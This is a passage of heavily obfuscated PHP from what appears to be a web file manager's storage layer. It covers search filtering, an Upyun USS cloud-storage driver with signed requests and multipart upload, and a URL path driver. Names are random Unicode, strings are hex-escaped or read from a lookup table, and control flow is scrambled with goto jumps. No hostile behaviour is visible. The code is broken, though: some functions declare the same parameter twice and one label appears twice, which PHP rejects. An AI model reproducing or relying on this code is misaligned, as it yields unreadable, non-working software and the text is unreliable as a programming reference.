array($e[7], $Cɞ)); goto b; b: $e莸 = $this->field($D﷈ą)->where($a۝)->select(); if (!$e莸) { return; } $fʩ = array(); goto aٓ; aٓ: foreach ($e莸 as $F) { if ($this->_listSearchFilter($F, $d)) { $fʩ[] = $F; } } $cЧ[$e[367]] = array_merge($fʩ, $cЧ[$e[367]]); $cЧ[$e[364]][$e[365]] += count($fʩ); goto fޯ; fޯ: } private function _listSearchFilter($Eמ, $aڭ) { goto Cзݶ; bሳԖ: if (isset($aڭ[$Aނ[562]]) && $aڭ[$Aނ[562]] != $Eמ[$Aނ[434]]) { return !1; } return !0; goto C܍; Cзݶ: $Aނ =& $_SERVER[̉]; $d݅ = $Eמ[$Aނ[403]] == $Aނ[87]; if (!strstr($Eמ[$Aނ[487]], $Aނ[47] . $aڭ[$Aނ[478]] . $Aނ[47])) { return !1; } goto F͸ކ; F͸ކ: if (isset($aڭ[$Aނ[405]]) && $aڭ[$Aނ[405]] != $Aނ[1745]) { if ($aڭ[$Aނ[405]] == $Aނ[77] && !$d݅) { return !1; } if ($aڭ[$Aނ[405]] != $Aނ[77] && $d݅) { return !1; } if (!strstr($Eמ[$Aނ[168]], $Aނ[47] . $aڭ[$Aނ[405]] . $Aނ[47])) { return !1; } } if (isset($aڭ[$Aނ[1941]]) && $aڭ[$Aނ[1941]] < $Eמ[$Aނ[78]]) { return !1; } if (isset($aڭ[$Aނ[1942]]) && $aڭ[$Aނ[1942]] > $Eמ[$Aނ[78]]) { return !1; } goto bሳԖ; C܍: } public function listSearchChildren($C, $e퉇 = 5000) { goto b; f: $C܌ = $this->field($d㵢[395])->where($dӶ)->select(); $A = array_to_keyvalue($C܌, $d㵢[33], $d㵢[395]); return $A; goto a̜; b: $d㵢 =& $_SERVER[̉]; $A = array(); $b = $this->sourceInfo($C); goto Fڱ; Fڱ: $dӶ = array($d㵢[487] => array($d㵢[380], $b[$d㵢[487]] . $b[$d㵢[395]] . $d㵢[513])); $d = $this->field($d㵢[395])->cache(null, 600)->where($dӶ)->count(); if ($d > $e퉇) { return $this->_listSearchChildrenNear($C, $e퉇); } goto f; a̜: } private function _listSearchChildrenNear($aȦ, $fͿ) { goto eᎴ; aļӚ: $Cۖѯ = $this->field($Dȓ[1943])->where($B͛)->select(); $F۞ = array_to_keyvalue(array_filter_by_field($Cۖѯ, $Dȓ[403], $Dȓ[87]), $Dȓ[33], $Dȓ[395]); $f = array_merge($f, array_to_keyvalue($Cۖѯ, $Dȓ[33], $Dȓ[395])); goto fƐů; eᎴ: $Dȓ =& $_SERVER[̉]; $f = array(); $B͛ = array($Dȓ[478] => $aȦ); goto aļӚ; fƐů: if (!$F۞) { return $f; } $B͛ = array($Dȓ[478] => array($Dȓ[7], $F۞)); $Cۖѯ = $this->field($Dȓ[1943])->where($B͛)->limit($fͿ)->select(); goto aÕ; aÕ: $f = array_merge($f, array_to_keyvalue($Cۖѯ, $Dȓ[33], $Dȓ[395])); $f = array_slice($f, 0, $fͿ); return $f; goto Eլ; Eլ: } private function _listSearchBindPinyin($Aɽ܋᭽, &$dݍ垤, &$C䫥) { goto AӐ; AӐ: $bǻ =& $_SERVER[̉]; if (!isset($Aɽ܋᭽[$bǻ[1778]]) || !$Aɽ܋᭽[$bǻ[1778]]) { return; } if (!Input::check($Aɽ܋᭽[$bǻ[1778]], $bǻ[316]) || strlen($Aɽ܋᭽[$bǻ[1778]]) < 2) { return; } goto C⣘; f: foreach ($dݍ垤 as $a弼 => $B¢) { $d⪇[$bǻ[1945] . $a弼] = $B¢; } foreach ($Dئ as $D샸ȹ) { $d⪇[] = array($bǻ[1947] => $D샸ȹ, $bǻ[956] => $bǻ[1782], array($bǻ[1948] => $D샸ȹ, $bǻ[1949] => array($bǻ[7], array($bǻ[444], $bǻ[443])))); } $this->join($fϪ); goto B; C⣘: $fϪ = "\114\x45\106\x54\40\112\117\111\x4e\x20{$this->tablePrefix}\151\x6f\137\163\157\x75\162\143\145\x5f\x6d\x65\164\141\40\155\x65\164\141\x20\x6f\156\x20\x73\x6f\x75\162\x63\145\56\x73\x6f\x75\x72\x63\x65\x49\x44\40\75\40\x6d\x65\164\141\56\x73\157\x75\162\x63\x65\x49\x44"; $d⪇ = array(); $C䫥 = str_replace(array($bǻ[229], $bǻ[50], $bǻ[1944]), $bǻ[33], $C䫥); goto Fݲɥ; Fݲɥ: $C䫥 = $bǻ[1945] . str_replace($bǻ[47], $bǻ[1946], $C䫥); $Dئ = $dݍ垤[$bǻ[28]]; unset($dݍ垤[$bǻ[28]]); goto f; B: $dݍ垤 = $d⪇; goto F┊Υ; F┊Υ: } private function _parseSearchWhere($d؄½) { goto e; Eژ: if (isset($d؄½[$FΫ[1778]]) && trim($d؄½[$FΫ[1778]])) { $a؍Օ = trim($d؄½[$FΫ[1778]]); $a = explode($FΫ[50], $a؍Օ); if (strlen($a؍Օ) > 2 && (substr($a؍Օ, 0, 1) == $FΫ[116] && substr($a؍Օ, -1) == $FΫ[116]) || substr($a؍Օ, 0, 1) == $FΫ[55] && substr($a؍Օ, -1) == $FΫ[55]) { $a؍Օ = substr($a؍Օ, 1, -1); $a = array($a؍Օ); } $b[$FΫ[28]] = array(array($FΫ[512], $FΫ[1780] . $a؍Օ . $FΫ[1780])); if (count($a) > 1) { $b[$FΫ[28]] = array(); foreach ($a as $B骸) { if (!trim($B骸)) { continue; } $b[$FΫ[28]][] = array($FΫ[512], $FΫ[1780] . trim($B骸) . $FΫ[1780]); } } } return $b; goto F; D: if (isset($d؄½[$FΫ[562]]) && $d؄½[$FΫ[562]]) { $b[] = array($FΫ[434] => $d؄½[$FΫ[562]], $FΫ[432] => $d؄½[$FΫ[562]], $FΫ[956] => $FΫ[1782]); } if (isset($d؄½[$FΫ[405]]) && $d؄½[$FΫ[405]]) { $e = $d؄½[$FΫ[405]]; if ($e == $FΫ[77]) { $b[$FΫ[403]] = 1; } else { if ($e == $FΫ[1953]) { $b[$FΫ[403]] = 0; } else { if ($e) { $e = is_array($e) ? $e : explode($FΫ[47], $e); $b[$FΫ[405]] = array($FΫ[411], $e); $b[$FΫ[403]] = 0; } } } } if (isset($d؄½[$FΫ[478]]) && $d؄½[$FΫ[478]]) { $E = $this->sourceInfo($d؄½[$FΫ[478]]); $b[$FΫ[553]] = array($FΫ[512], $E[$FΫ[487]] . $d؄½[$FΫ[478]] . $FΫ[513]); } goto Eژ; e˙: if (isset($d؄½[$FΫ[476]]) && $d؄½[$FΫ[476]]) { $C = array($FΫ[1951], $d؄½[$FΫ[476]]); if ($b[$FΫ[84]]) { $b[$FΫ[84]] = array($b[$FΫ[84]], $C, $FΫ[1952]); } else { $b[$FΫ[84]] = $C; } } if (isset($d؄½[$FΫ[1941]]) && $d؄½[$FΫ[1941]] > 0) { $b[$FΫ[78]] = array($FΫ[1950], $d؄½[$FΫ[1941]]); } if (isset($d؄½[$FΫ[1942]]) && $d؄½[$FΫ[1942]]) { $C = array($FΫ[1951], $d؄½[$FΫ[1942]]); if ($b[$FΫ[78]]) { $b[$FΫ[78]] = array($b[$FΫ[78]], $C, $FΫ[1952]); } else { $b[$FΫ[78]] = $C; } } goto D; e: $FΫ =& $_SERVER[̉]; $b = array(); if (isset($d؄½[$FΫ[724]]) && $d؄½[$FΫ[724]]) { $b[$FΫ[84]] = array($FΫ[1950], $d؄½[$FΫ[724]]); } goto e˙; F: } } goto DŲ䃂; bϏЏʤ: class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\164\164\160\72\x2f\x2f\166\x30\x2e\141\160\151\x2e\x75\160\171\165\156\56\143\x6f\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($fԶފ) { parent::__construct(); $this->_init($fԶފ); } public function _init($d݋ϥɼ) { $aÇ =& $_SERVER[̉]; foreach ($d݋ϥɼ as $fڝϑ => $eǌ) { if (isset($this->{$fڝϑ})) { $this->{$fڝϑ} = $eǌ; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($aÇ[1331] . LNG($aÇ[1263])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($D潉, $Eؑ = "\x47\x45\x54") { $C楑ą =& $_SERVER[̉]; $C̃ = gmdate($C楑ą[1297]); $F = base64_encode(hash_hmac($C楑ą[1332], "{$Eؑ}\46{$D潉}\x26{$C̃}", md5("{$this->userpass}"), !0)); $bܑ = array("\x41\x75\164\x68\157\x72\151\172\141\x74\151\x6f\x6e\72\125\x50\x59\x55\116\x20{$this->username}\72{$F}", "\x44\x61\164\x65\72{$C̃}"); return $bܑ; } public function ussRequest($d҇, $EϲŴ = "\x47\x45\x54", $Fº = false, $b = false, $Aپ௷ = false) { goto D; D: $b =& $_SERVER[̉]; $d҇ = trim($d҇, $b[8]); $bʋ = "\x2f{$this->bucket}\x2f{$d҇}"; goto C䰍; C䰍: $Aҝ = $this->ussHeaders($bʋ, $EϲŴ); if ($b) { $Aҝ = array_merge($Aҝ, $b); } $dݛ = url_request($this->endpoint . $bʋ, $EϲŴ, $Fº, $Aҝ, $Aپ௷); goto Dև; Dև: if (!$dݛ) { return array($b[1085] => !1, $b[1087] => $b[1333]); } if (strtolower($EϲŴ) == $b[190] || in_array($dݛ[$b[1085]], array($b[1188], $b[1334]))) { $Fº = $dݛ[$b[1335]]; } else { $Fº = json_decode($dݛ[$b[1087]], !0); if (!$Fº) { $Fº = $dݛ[$b[1087]]; } else { if (!$dݛ[$b[713]] && isset($Fº[$b[1336]])) { $Fº = $Fº[$b[1336]]; } } } return array($b[1085] => $dݛ[$b[713]], $b[1087] => $Fº); goto D; D: } public function mkfile($f, $f = '', $fуĎ = REPEAT_RENAME) { if ($this->setContent($f, $f)) { return $this->getPathOuter($f); } return !1; } public function mkdir($Dࢭ, $A⭝ = REPEAT_SKIP) { $Eם =& $_SERVER[̉]; $E贎 = trim($Dࢭ, $Eם[8]); if ($this->_isFolder($E贎)) { return $this->getPathOuter($E贎); } $f = array($Eם[1337]); $dȇ = $this->ussRequest($E贎, $Eם[224], !1, $f); return $dȇ[$Eם[1085]] ? $this->getPathOuter($E贎) : !1; } public function copyFile($e缦, $f͓) { $fՙ؂ =& $_SERVER[̉]; $bٞ = array($fՙ؂[1338] . "\x2f{$this->bucket}\x2f{$e缦}", $fՙ؂[1339]); $fǊ = $this->ussRequest($f͓, $fՙ؂[226], !1, $bٞ); return $fǊ[$fՙ؂[1085]] ? !0 : $this->getPathOuter($f͓); } public function moveFile($D, $dӞϝ) { $e =& $_SERVER[̉]; $Dգ = array($e[1340] . "\57{$this->bucket}\57{$D}", $e[1339]); $Eԋ = $this->ussRequest($dӞϝ, $e[226], !1, $Dգ); return $Eԋ[$e[1085]] ? !0 : $this->getPathOuter($dӞϝ); } public function delFile($cͅ) { $b =& $_SERVER[̉]; $Bݔž = $this->ussRequest($cͅ, $b[1341]); return $Bݔž[$b[1085]] ? !0 : !1; } public function delFolder($BӨ) { goto B; B: $E罸 =& $_SERVER[̉]; if (!$this->exist($BӨ)) { return !0; } $this->listItemCache = !1; goto FՋΠ; fꞮ: foreach ($Dڙ as $EΟư) { $Cﳪ = $this->ussRequest($EΟư[$E罸[28]], $E罸[1341]); if (!$Cﳪ[$E罸[1085]]) { return !1; } } foreach ($Aޞ as $E) { $Cﳪ = $this->ussRequest($E, $E罸[1341]); if (!$Cﳪ[$E罸[1085]]) { return !1; } } $Cﳪ = $this->ussRequest($BӨ, $E罸[1341]); goto D솩; FՋΠ: $Aޞ = $Dڙ = array(); $this->fileList($BӨ, $Aޞ, $Dڙ, !0); $this->listItemCache = !0; goto fꞮ; D솩: return $Cﳪ[$E罸[1085]]; goto E斱; E斱: } public function rename($a, $c՜) { if ($this->isFile($a)) { $c՜ = get_path_father($a) . $c՜; return $this->moveFile($a, $c՜); } return $this->renameObject($a, $c՜); } public function fileInfo($Bʋ, $B󽎿 = false, $d = array()) { goto E; E: $f =& $_SERVER[̉]; $f߬֒ = array($f[28] => $this->pathThis($Bʋ), $f[76] => $this->getPathOuter($f[8] . $Bʋ), $f[29] => $f[193], $f[78] => isset($d[$f[78]]) ? $d[$f[78]] : 0, $f[168] => $this->ext($Bʋ)); if ($B󽎿) { return $f߬֒; } goto D; D: $f߬֒[$f[194]] = $f߬֒[$f[84]] = 0; $f߬֒[$f[195]] = $f߬֒[$f[196]] = !0; if (empty($d)) { $d = $this->objectMeta($Bʋ); if (!$d) { return $f߬֒; } } goto bČ; bČ: $f߬֒[$f[194]] = intval($d[$f[1342]]); $f߬֒[$f[84]] = intval($d[$f[1343]]); $f߬֒[$f[78]] = $d[$f[78]]; goto d; d: return $f߬֒; goto bٓ; bٓ: } public function folderInfo($aؖ, $D쳣 = false) { goto F; E֐ֺ: $fӰł[$Cۜ[194]] = $fӰł[$Cۜ[84]] = 0; $fӰł[$Cۜ[195]] = $fӰł[$Cۜ[196]] = !0; if (empty($Aت)) { $Aت = $this->objectMeta($aؖ); if (!$Aت) { return $fӰł; } } goto E; E: $fӰł[$Cۜ[194]] = intval($Aت[$Cۜ[1342]]); $fӰł[$Cۜ[84]] = intval($Aت[$Cۜ[1343]]); return $fӰł; goto Cڢо; F: $Cۜ =& $_SERVER[̉]; $fӰł = array($Cۜ[28] => $this->pathThis($aؖ), $Cۜ[76] => $this->getPathOuter($Cۜ[8] . $aؖ), $Cۜ[29] => $Cۜ[77]); if ($D쳣) { return $fӰł; } goto E֐ֺ; Cڢо: } private function listObjs($Dٳ, $F = 0, $F = 1000) { $aѬ =& $_SERVER[̉]; $B埪 = array($aѬ[1344], $aѬ[1345] . $F); if ($F) { $B埪[] = $aѬ[1346] . $F; } $dڮ = $this->ussRequest($Dٳ, $aѬ[228], !1, $B埪); return !$dڮ[$aѬ[1085]] ? !1 : $dڮ[$aѬ[1087]]; } private function fileList($E, &$A, &$c쑗, $aƒ = false) { goto Cυ; cΤ: if ($b) { $this->cacheMethod($B[199], $E, !0); } goto d֫; D: $fԑ΢ = rtrim($E, $B[8]) . $B[8]; $b = $this->listItemCache === !1 ? !1 : !0; while (!0) { check_abort(); $d鏠ё = $this->listObjs($E, $F샥Ր, $bޑ); if (!$d鏠ё) { return !1; } $F샥Ր = isset($d鏠ё[$B[1347]]) ? $d鏠ё[$B[1347]] : $B[33]; $F = isset($d鏠ё[$B[1348]]) ? $d鏠ё[$B[1348]] : array(); foreach ($F as $dū) { $eǌ = $dū[$B[29]] == $B[77] ? !0 : !1; $b = ltrim($fԑ΢ . $dū[$B[28]], $B[8]) . ($eǌ ? $B[8] : $B[33]); $f = array($B[28] => $b, $B[29] => $eǌ ? $B[77] : $B[193], $B[78] => $dū[$B[335]], $B[1343] => $dū[$B[1349]]); if ($b) { $this->cacheMethod($B[199], $b, $eǌ); $this->cacheMethod($B[200], $b, $f); } if ($eǌ) { $A[] = $b; if ($aƒ) { $this->fileList($b, $A, $c쑗, $aƒ); } continue; } $c쑗[] = $f; } if (count($F) < $bޑ) { break; } } goto cΤ; Cυ: $B =& $_SERVER[̉]; $F샥Ր = $B[33]; $bޑ = 1000; goto D; d֫: } public function listPath($a, $FЍ = false) { $C =& $_SERVER[̉]; $d = $cӚ = array(); $this->fileList($a, $d, $cӚ); foreach ($d as $cܖ => $c򟢡) { $d[$cܖ] = $this->folderInfo($c򟢡, $FЍ); } foreach ($cӚ as $cܖ => $c򟢡) { $cӚ[$cܖ] = $this->fileInfo($c򟢡[$C[28]], $FЍ, $c򟢡); } return array($C[75] => $d, $C[74] => $cӚ); } public function has($ĕ؏Ϛ, $Bݼ = false, $a = true) { goto f; f: $fݮ䤍Ѣ =& $_SERVER[̉]; $AɈ = $fݮ䤍Ѣ[33]; $F = 500; goto AЖ; AЖ: $f΂ = 0; $b窮 = 0; $Fܳ˹ = rtrim($ĕ؏Ϛ, $fݮ䤍Ѣ[8]) . $fݮ䤍Ѣ[8]; goto eƂꛗ; eƂꛗ: while (!0) { check_abort(); $Fԭƺ = $this->listObjs($ĕ؏Ϛ, $AɈ, $F); if (!$Fԭƺ) { return !1; } $AɈ = isset($Fԭƺ[$fݮ䤍Ѣ[1347]]) ? $Fԭƺ[$fݮ䤍Ѣ[1347]] : $fݮ䤍Ѣ[33]; $b݂ש = isset($Fԭƺ[$fݮ䤍Ѣ[1348]]) ? $Fԭƺ[$fݮ䤍Ѣ[1348]] : array(); if (empty($b݂ש)) { break; } $Fԋ = array_filter($b݂ש, function ($a) { $b˻ =& $_SERVER[̉]; return $a[$b˻[29]] == $b˻[77]; }); $Dⶂ = count($b݂ש); $Fԋ = count($Fԋ); $F܃ = $Dⶂ - $Fԋ; if ($Bݼ) { $b窮 += $Fԋ; $f΂ += $F܃; if ($Dⶂ < $F) { break; } continue; } if ($a) { if ($F܃) { return !0; } } else { if ($Fԋ) { return !0; } } if ($Dⶂ < $F) { break; } } if ($Bݼ) { return array($fݮ䤍Ѣ[203] => $f΂, $fݮ䤍Ѣ[204] => $b窮); } return !1; goto CϞ; CϞ: } public function listAll($dͬ) { goto f; f: $B =& $_SERVER[̉]; $C = $F֭ۿ = array(); $this->fileList($dͬ, $C, $F֭ۿ, !0); goto Dǯ; A꛱Ǟ: return $this->listAllFiles($dͬ, array_keys($E), $E); goto b¬Ѩ; Dǯ: $E = array(); foreach ($F֭ۿ as $c) { $E[$c[$B[28]]] = $c[$B[78]]; } foreach ($C as $c) { if (is_string($c)) { $E[$c] = 0; } } goto A꛱Ǟ; b¬Ѩ: } public function canRead($e짵Š) { return $this->exist($e짵Š) ? !0 : !1; } public function canWrite($e寤) { return $this->exist($e寤) ? !0 : !1; } public function getContent($a׵ȏ) { return $this->fileSubstr($a׵ȏ, 0, -1); } public function setContent($Fͬ, $Bȝ = '') { $eĈ =& $_SERVER[̉]; if (!$Bȝ) { $d؉߉ = $this->ussRequest($Fͬ, $eĈ[224]); return $d؉߉[$eĈ[1085]]; } $c֐ = $this->tempFile($this->pathThis($Fͬ)); file_put_contents($c֐, $Bȝ); if ($this->upload($Fͬ, $c֐)) { $this->tempFileRemve($c֐); return !0; } return !1; } public function fileSubstr($D, $Ȇ, $a٘) { $Bե =& $_SERVER[̉]; if (!($Aɾһ = $this->link($D))) { return !1; } $Cɐϸ = !1; if ($a٘ > 0) { $Fϖ = $Ȇ + $a٘ - 1; $Cɐϸ = array($Bե[1310] . $Ȇ . $Bե[440] . $Fϖ); } $A旃 = url_request($Aɾһ, $Bե[228], !1, $Cɐϸ); return $A旃[$Bե[713]] ? $A旃[$Bե[1087]] : !1; } public function upload($FÏٓ, $e̴޸, $B𚴒 = false, $c = REPEAT_REPLACE) { goto dٚλ; E: if (!$B[$cĩ[1085]]) { return !1; } $C = $B[$cĩ[1087]]; $C̫ = 0; goto AӾ; AӾ: $f = $C[$cĩ[1355]]; $DЉ = fopen($e̴޸, $cĩ[1260]); if (!$DЉ) { return !1; } goto Bő; Bő: do { $f = $C[$cĩ[1356]]; fseek_64($DЉ, $C̫); $Dֹ = fread($DЉ, $f); $EЃ = 0; do { $EЃ++; $C = $this->uploadPart($FÏٓ, $C, $Dֹ); } while (!$C && $EЃ < 3); if (!$C) { return !1; } $f = $C[$cĩ[1355]]; $C̫ += $f; } while ($f != -1); fclose($DЉ); $C = array($cĩ[1357], $cĩ[1358] . $C[$cĩ[1359]], $cĩ[1353]); goto A; B: $aҖ = 1024 * 1024 * 10; $C = array($cĩ[1351], $cĩ[1352] . $C׍, $cĩ[1353], $cĩ[1354] . $aҖ); $B = $this->ussRequest($FÏٓ, $cĩ[226], !1, $C); goto E; A: $B = $this->ussRequest($FÏٓ, $cĩ[226], !1, $C); return $B[$cĩ[1085]] ? $this->getPathOuter($Dʝ·) : !1; goto b; dٚλ: $cĩ =& $_SERVER[̉]; $C׍ = IO::size($e̴޸); if ($C׍ <= 1024 * 1024 * 200) { $D = array($cĩ[1350] . $e̴޸); $B = $this->ussRequest($FÏٓ, $cĩ[226], $D); return $B[$cĩ[1085]] ? $this->getPathOuter($FÏٓ) : !1; } goto B; b: } private function uploadPart($d, $dǷƬ, &$cӪ⬦) { $a =& $_SERVER[̉]; $cì = array($a[1360], $a[1358] . $dǷƬ[$a[1359]], $a[1361] . $dǷƬ[$a[1355]], $a[141] . $dǷƬ[$a[1356]]); $e = $this->ussRequest($d, $a[226], $cӪ⬦, $cì); return !$e[$a[1085]] ? $e[$a[1085]] : $e[$a[1087]]; } public function uploadFormData($Aꖪą, $FԂ = 3600) { return $this->uploadPolicy($Aꖪą, $FԂ); } public function multiUploadFormData($f, $D𣣠 = 3600) { $cɬ =& $_SERVER[̉]; $B刬ݐ = (int) $GLOBALS[$cɬ[7]][$cɬ[78]]; return $this->uploadPolicy($f, $D𣣠, $B刬ݐ); } private function uploadPolicy($F̩ۜ, $e҆ = 3600, $E = 0) { goto eӸ; c: $f = base64_encode(hash_hmac($E옂[1332], "\x50\x4f\123\124\46{$b}\x26{$bϨ}\x26{$f}", md5("{$this->userpass}"), !0)); $aҧબ = array($E옂[1200] => $f, $E옂[1366] => "\125\x50\x59\x55\116\40{$this->username}\72{$f}", $E옂[175] => $this->endpoint . $b); return $aҧબ; goto Cϩ; eӸ: $E옂 =& $_SERVER[̉]; $b = $E옂[8] . $this->bucket; $bϨ = gmdate($E옂[1297]); goto eɍ; eɍ: $eم = array($E옂[1362] => $this->bucket, $E옂[1363] => $F̩ۜ, $E옂[1364] => time() + $e҆, $E옂[1365] => $bϨ); if ($E) { $eم[$E옂[1276]] = $E; } $f = base64_encode(json_encode($eم)); goto c; Cϩ: } public function download($A؜ሬ, $aĎ) { goto Ȅ; Ȅ: $d = IO::getPathInner(IO::mkfile($aĎ)); if (!($BŔ = $this->link($A؜ሬ))) { return !1; } $a = 0; goto a̒; B򡃤Θ: fclose($bҋ); return $aĎ; goto bܧ۶; a̒: $C坞 = 1024 * 200; $bҋ = fopen($d, $_SERVER[̉][1316]); while (!0) { $AҞ״ = $this->fileSubstr($A؜ሬ, $a, $C坞); if ($AҞ״ === !1) { return !1; } fwrite($bҋ, $AҞ״); $a += $C坞; if (strlen($AҞ״) < $C坞) { break; } } goto B򡃤Θ; bܧ۶: } public function link($Cůϊ, $b = array()) { $cޣ܉ =& $_SERVER[̉]; $Cůϊ = trim($Cůϊ, $cޣ܉[8]); if (!empty($this->token)) { $dԑ = strtotime(date($cޣ܉[1367])); $b، = substr(md5($this->token . $cޣ܉[282] . $dԑ . $cޣ܉[1368] . $Cůϊ), 12, 8) . $dԑ; $b[] = $cޣ܉[1369] . $b،; } $aٍ = !empty($b) ? $cޣ܉[70] . implode($cޣ܉[282], $b) : $cޣ܉[33]; return $this->getHost() . $cޣ܉[8] . $Cůϊ . $aٍ; } public function fileOut($Cإ, $a = false, $Aݢ = false, $Fա = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($Cإ, $a, $Aݢ, $Fա); } if (!$Aݢ) { $Aݢ = $this->pathThis($Cإ); } $E܌ = $a ? array($_SERVER[̉][1370] . rawurlencode($Aݢ)) : array(); $F٪ = $this->link($Cإ, $E܌); $this->fileOutLink($F٪); } public function fileOutServer($f䵗, $a = false, $c֕軽 = false, $f = '') { parent::fileOut($f䵗, $a, $c֕軽, $f); } public function fileOutImage($e, $EƋϢ = 250) { $A򎄅 = $this->link($e . $_SERVER[̉][1371] . $EƋϢ); $this->fileOutLink($A򎄅); } public function fileOutImageServer($d, $c = 250) { parent::fileOutImage($d, $c); } public function hashMd5($e֧⪗) { $e֤ =& $_SERVER[̉]; $C̩ = $this->_objectMeta($e֧⪗); return isset($C̩[$e֤[208]]) ? $C̩[$e֤[208]] : !1; } public function size($Aɦ) { $dǒ˛ = $this->objectMeta($Aɦ); return $dǒ˛ ? $dǒ˛[$_SERVER[̉][78]] : 0; } public function info($eʃ) { if ($this->isFolder($eʃ)) { return $this->folderInfo($eʃ); } else { if ($this->isFile($eʃ)) { return $this->fileInfo($eʃ); } } return !1; } public function exist($fج) { return $this->isFile($fج) || $this->isFolder($fج); } public function isFile($DО) { return !$this->isFolder($DО) && $this->objectMeta($DО); } public function isFolder($Fʿȗ) { return $this->cacheMethod($_SERVER[̉][199], $Fʿȗ); } protected function objectMeta($D) { return $this->cacheMethod($_SERVER[̉][200], $D); } protected function _objectMeta($E) { goto f썃; Cب: if (!$b[$c讱[1085]]) { return null; } $D = isset($b[$c讱[1087]]) ? $b[$c讱[1087]] : array(); if (!isset($D[$c讱[1373]])) { return null; } goto aŪ; f썃: $c讱 =& $_SERVER[̉]; if ($E == $c讱[33] || $E == $c讱[8]) { return array(); } $b = $this->ussRequest($E, $c讱[1372]); goto Cب; aŪ: $cд = array($c讱[29] => isset($D[$c讱[1373]]) ? $D[$c讱[1373]] : null, $c讱[78] => isset($D[$c讱[1374]]) ? $D[$c讱[1374]] : null, $c讱[208] => isset($D[$c讱[1375]]) ? $D[$c讱[1375]] : null, $c讱[1342] => isset($D[$c讱[1376]]) ? $D[$c讱[1376]] : null); $cд[$c讱[1343]] = isset($D[$c讱[1377]]) ? strtotime($D[$c讱[1377]]) : $cд[$c讱[1342]]; return $cд; goto FǤڅ; FǤڅ: } protected function _isFolder($E󎋹) { $fڙ =& $_SERVER[̉]; if ($E󎋹 == $fڙ[33] || $E󎋹 == $fڙ[8]) { return !0; } $a̤ = $this->_objectMeta($E󎋹); return isset($a̤[$fڙ[29]]) && $a̤[$fڙ[29]] == $fڙ[77] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($D͐ = false) { } public function exist($eϡ) { $fݫ = $this->info($eϡ); return $fݫ[$_SERVER[̉][195]]; } public function isFile($C) { $eǃ = $this->info($C); return $eǃ[$_SERVER[̉][195]]; } public function isFolder($BҐ) { return !1; } public function size($b) { $E = $this->info($b); return $E[$_SERVER[̉][78]]; } public function info($C˵؉) { return $this->infoParse($C˵؉); } public function infoAuth($b) { return $this->infoParse($b); } public function infoWithChildren($Eɭ) { return $this->infoParse($Eɭ); } public function infoFull($AƱ՟) { return $this->infoParse($AƱ՟); } private function infoParse($Bǯ) { $dŪ =& $_SERVER[̉]; $cԐ = $this->header($Bǯ); if (!$cԐ || !$cԐ[$dŪ[713]]) { return !1; } $f׷ݔ = _get($cԐ, $dŪ[335], 0); $E = array($dŪ[28] => $cԐ[$dŪ[28]], $dŪ[76] => $Bǯ, $dŪ[29] => $dŪ[193], $dŪ[78] => intval($f׷ݔ), $dŪ[168] => get_path_ext($cԐ[$dŪ[28]]), $dŪ[1257] => $f׷ݔ > 0 && $cԐ[$dŪ[1378]], $dŪ[1258] => !1); return $E; } private function header($aƋҫ) { goto cݘ; B: return self::$_cacheHeader[$aƋҫ]; goto b; cݘ: $b̝ܩ =& $_SERVER[̉]; if (isset(self::$_cacheHeader[$aƋҫ])) { return self::$_cacheHeader[$aƋҫ]; } $e = isset($GLOBALS[$b̝ܩ[1379]]) ? $GLOBALS[$b̝ܩ[1379]] : !1; goto FԎ; FԎ: $GLOBALS[$b̝ܩ[1379]] = !0; self::$_cacheHeader[$aƋҫ] = url_header($aƋҫ); $GLOBALS[$b̝ܩ[1379]] = $e; goto B; b: } public function hashSimple($dْٱ, $Dʈ = false) { goto B֮; Aީ: $B = $Fպ흉[$d[78]]; $Cޝ = 200; $cĽ = 50; goto Cє; B֮: $d =& $_SERVER[̉]; $Fպ흉 = $this->info($dْٱ); if (!$Fպ흉 || !$Fպ흉[$d[195]]) { return !1; } goto Aީ; Cє: if ($B <= $Cޝ * $cĽ) { return md5($this->fileSubstr($dْٱ, 0, $B)) . $B; } $EˎٲƂ = intval($B / $cĽ); $Cҕ = $d[33]; goto aܹ; C۠: $Cҕ .= $this->fileSubstr($dْٱ, $B - $Cޝ, $Cޝ); return md5($Cҕ) . $B; goto cўĄ; aܹ: $c̹ = timeFloat(); $C = 15; for ($cۺΙ = 0; $cۺΙ < $cĽ; $cۺΙ++) { if (timeFloat() - $c̹ > $C) { return !1; } $Cń֭ = $this->fileSubstr($dْٱ, $EˎٲƂ * $cۺΙ, $Cޝ); if (!$Cń֭) { return !1; } $Cҕ .= $Cń֭; } goto C۠; cўĄ: } public function getContent($c岔) { return $this->fileSubstr($c岔); } public function fileSubstr($Fӫ, $DӇýĬ = 0, $aө = -1) { goto c; c: $dȞ =& $_SERVER[̉]; $e㖋 = $this->info($Fӫ); if (!$e㖋 || !$e㖋[$dȞ[195]] && $e㖋[$dȞ[78]] > 1024 * 1024 * 10) { return !1; } goto F԰; cا̧: $aݘ = url_request($Fӫ, $dȞ[228], !1, $FӅļ, !1, !1, 1); return $aݘ[$dȞ[1087]] ? $aݘ[$dȞ[1087]] : $dȞ[33]; goto D䊄; F԰: if ($aө === -1) { $aө = $e㖋[$dȞ[78]]; } if ($aө == 0) { return $dȞ[33]; } $FӅļ = array($dȞ[1380] . $DӇýĬ . $dȞ[747] . ($DӇýĬ + $aө - 1)); goto cا̧; D䊄: } public function download($d, $ḑͲ) { Downloader::start($d, $ḑͲ); return $ḑͲ; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($cØ, $B̷ƞ = '') { goto aы; bǯ: $this->pathOpen = $cØ; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } goto fō; aы: $this->info = $this->info($cØ); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[̉][76]]; goto bǯ; fō: if (!isset(self::$_chunkBuffer[$cØ])) { self::$_chunkBuffer[$cØ] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; goto b؇; b؇: } function stream_read($dи) { 